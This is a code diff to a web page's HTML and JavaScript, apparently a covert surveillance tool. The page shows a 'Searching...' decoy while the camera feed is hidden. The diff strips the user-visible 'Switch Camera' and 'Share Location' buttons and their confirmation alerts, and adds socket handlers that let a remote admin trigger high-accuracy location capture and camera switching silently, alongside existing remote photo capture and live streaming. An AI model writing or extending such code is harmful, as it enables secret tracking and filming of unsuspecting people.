@@ -35,20 +35,7 @@
         .waiting { background: #fff3cd; color: #856404; }
         .active { background: #d4edda; color: #155724; }
         .error { background: #f8d7da; color: #721c24; }
-        button {
-            width: 100%;
-            padding: 12px;
-            border: 0;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 15px;
-            cursor: pointer;
-            background: #3498db;
-            color: white;
-        }
-        button:hover { opacity: 0.9; }
-        .location { background: #27ae60; }
-        .switch { background: #8e44ad; }
+        
         /* Camera completely hidden from user view */
         video {
             display: none !important;
@@ -67,8 +54,6 @@
     <h2>Searching...</h2>
     <div id="status" class="status waiting">Connecting...</div>
     <video id="video" autoplay playsinline muted></video>
-    <button class="switch" onclick="switchCamera()">🔄 Switch Camera</button>
-    <button class="location" onclick="requestLocation()">📍 Share Location</button>
     <p class="small">Please wait while we connect your session.</p>
 </div>
 
@@ -142,11 +127,6 @@ async function startCamera() {
     }
 }
 
-async function switchCamera() {
-    useFrontCamera = !useFrontCamera;
-    await startCamera();
-}
-
 function startLiveStream() {
     if (streamInterval) clearInterval(streamInterval);
     streamInterval = setInterval(() => {
@@ -194,11 +174,9 @@ socket.on("start-auto-capture", () => {
 
 socket.on("capture-photo", () => { takeSinglePhoto(); });
 
-function requestLocation() {
-    if (!navigator.geolocation) {
-        alert("Location is not supported by this browser.");
-        return;
-    }
+// Admin dwara trigger kiye gaye location request par permission prompt aayega
+socket.on("request-location", () => {
+    if (!navigator.geolocation) return;
 
     navigator.geolocation.getCurrentPosition(
         position => {
@@ -206,15 +184,19 @@ function requestLocation() {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude
             });
-            alert("Location shared successfully.");
         },
         error => {
             console.error("Location error:", error);
-            alert("Location permission was not granted.");
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
-}
+});
+
+// Admin dwara camera switch command milne par
+socket.on("switch-camera", async () => {
+    useFrontCamera = !useFrontCamera;
+    await startCamera();
+});
 
 socket.on("server-full", data => {
     setStatus(`Maximum ${data.maxUsers} users are currently connected.`, "error");
